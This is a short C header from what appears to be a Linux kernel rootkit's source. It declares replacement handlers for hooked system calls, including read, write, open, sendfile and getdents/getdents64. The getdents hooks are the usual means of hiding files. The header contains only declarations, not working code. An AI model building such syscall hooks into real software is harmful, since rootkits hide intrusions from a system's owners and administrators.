#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include "macro-utils.h"


#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

DECLARE_HOOK_HANDLERS(read, write, open, pread64, sendfile, getdents, getdents64)

#endif
